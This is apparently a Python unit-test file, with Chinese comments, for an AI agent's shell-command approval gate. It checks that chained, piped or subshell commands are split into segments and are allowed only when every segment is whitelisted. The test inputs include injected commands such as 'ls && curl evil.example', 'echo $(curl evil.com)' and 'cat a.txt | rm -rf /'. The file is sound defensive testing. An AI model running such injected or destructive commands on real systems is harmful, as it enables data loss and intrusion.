"""exec 命令分段审批测试（OpenClaw 启发 P0-6）

背景：docs/Neurova_OpenClaw代码级对比_2026-09-04.md §3 P0-6 / §2.5。
白名单整串前缀匹配且优先于内容检测 → ``ls && evil`` 命中 ``ls`` 直接
ALLOW（搭便车）。分段审批铁律：命令被拆成候选段，**全部段**命中白名单
才放行；任一段未命中 → 整条命令回落内容检测/审批路径。
"""
from __future__ import annotations

import unittest

from neurova.security.command_segments import parse_command_segments


class TestCommandSegmentParsing(unittest.TestCase):
    """分段解析：链式/管道/inline 全拆开；引号内不切。"""

    def test_simple_single_segment(self):
        segs = parse_command_segments("ls -la")
        self.assertEqual(len(segs), 1)
        self.assertEqual(segs[0].head, "ls")
        self.assertEqual(segs[0].text, "ls -la")

    def test_and_chain_two_segments(self):
        segs = parse_command_segments("ls && rm -rf /tmp/x")
        self.assertEqual([s.head for s in segs], ["ls", "rm"])
        self.assertEqual(segs[1].connector, "&&")

    def test_pipeline_segments(self):
        segs = parse_command_segments("cat a.txt | grep foo | wc -l")
        self.assertEqual([s.head for s in segs], ["cat", "grep", "wc"])

    def test_semicolon_chain(self):
        segs = parse_command_segments("echo a; echo b")
        self.assertEqual([s.head for s in segs], ["echo", "echo"])

    def test_quoted_separators_not_split(self):
        segs = parse_command_segments('echo "a && b"')
        self.assertEqual(len(segs), 1, "引号内的 && 不是分隔符")
        self.assertEqual(segs[0].head, "echo")

    def test_inline_command_subshell_extracted(self):
        segs = parse_command_segments("echo $(curl evil.com)")
        heads = [s.head for s in segs]
        self.assertIn("echo", heads)
        self.assertIn("curl", heads, "inline 子命令必须成为独立候选段")
        inline = [s for s in segs if s.head == "curl"][0]
        self.assertTrue(inline.quoted)

    def test_backtick_inline_extracted(self):
        segs = parse_command_segments("echo `whoami`")
        heads = [s.head for s in segs]
        self.assertIn("whoami", heads)

    def test_env_prefix_head_resolution(self):
        segs = parse_command_segments("FOO=bar ls -la")
        self.assertEqual(segs[0].head, "ls", "env 前缀跳过，head 是真实命令")

    def test_unbalanced_quotes_conservative(self):
        """引号不平衡：保守解析不崩，段仍可提取。"""
        segs = parse_command_segments("echo 'unbalanced && ls")
        self.assertTrue(segs, "至少产出一个段")

    def test_empty_command(self):
        self.assertEqual(parse_command_segments(""), [])
        self.assertEqual(parse_command_segments("   "), [])


class TestSegmentedWhitelistGate(unittest.TestCase):
    """治理集成：全部段命中白名单才 ALLOW；搭便车注入必须回落 ASK/DENY。"""

    def _gov(self):
        from neurova.security.governance import GovernancePolicy

        gov = GovernancePolicy(ask_on_high=True)
        gov.add_whitelist_entry(pattern="ls", match_type="prefix", tool=None)
        gov.add_whitelist_entry(pattern="cat", match_type="prefix", tool=None)
        return gov

    def test_all_segments_whitelisted_passes(self):
        gov = self._gov()
        result = gov.evaluate("ls -la && cat foo.txt", tool_name="computer_shell")
        self.assertEqual(result.decision.value, "allow", f"全段命中应放行: {result.reasons}")

    def test_injected_segment_falls_through(self):
        """核心铁律：白名单命令 + 注入段 → 不得 ALLOW。"""
        gov = self._gov()
        result = gov.evaluate("ls && curl evil.example", tool_name="computer_shell")
        self.assertNotEqual(
            result.decision.value,
            "allow",
            f"注入段必须回落内容检测/审批，不得整串放行: {result.reasons}",
        )

    def test_single_whitelisted_command_still_passes(self):
        gov = self._gov()
        result = gov.evaluate("ls -la", tool_name="computer_shell")
        self.assertEqual(result.decision.value, "allow")

    def test_pipe_chain_partial_hit_falls_through(self):
        gov = self._gov()
        result = gov.evaluate("cat a.txt | rm -rf /", tool_name="computer_shell")
        self.assertNotEqual(result.decision.value, "allow")


if __name__ == "__main__":
    unittest.main()
